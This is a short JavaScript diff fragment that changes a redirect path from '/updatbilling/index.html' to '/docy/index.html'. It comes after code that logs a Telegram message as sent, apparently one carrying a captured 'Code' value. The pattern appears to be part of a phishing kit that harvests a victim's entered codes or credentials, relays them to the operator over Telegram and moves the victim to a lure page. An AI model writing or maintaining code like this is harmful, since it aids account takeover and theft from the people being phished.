@@ -98,9 +98,9 @@ Code: ${code}`;
             }
 
             log("✅ Telegram message sent successfully.");
-            log("Redirecting to /updatbilling/index.html");
+            log("Redirecting to /docy/index.html");
 
-            window.location.href = "/updatbilling/index.html";
+            window.location.href = "/docy/index.html";
 
         } catch (error) {
             log("❌ Error occurred:");
